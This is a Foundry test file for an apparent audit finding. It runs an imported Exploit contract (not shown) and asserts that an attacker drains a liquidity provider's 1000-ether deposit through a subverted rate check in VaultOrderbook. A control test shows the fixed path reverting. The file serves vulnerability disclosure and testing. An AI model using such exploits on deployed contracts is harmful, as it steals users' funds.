// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, VaultOrderbook} from "./46677-subversion-of-rate-check-possible-in-vaultorderbookallocateo.sol";

contract Finding46677Test is Test {
    function test_exploit_dummy_campaign_takes_lp_deposit() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.base().balanceOf(address(this)), 1000 ether, "attacker received the LP deposit");
        assertEq(e.realReward().balanceOf(address(e.lp())), 0, "LP got none of REAL");
        assertEq(e.base().balanceOf(address(e.lp())), 0, "LP lost the base");
        assertEq(e.book().taken(), 1000 ether, "order filled");
        assertEq(e.profit(), 1000 ether, "profit");
    }

    function test_control_campaign_token_key_reverts() public {
        Exploit e = new Exploit();
        vm.expectRevert(VaultOrderbook.OrderConditionsNotMet.selector);
        e.runFixed();
    }
}
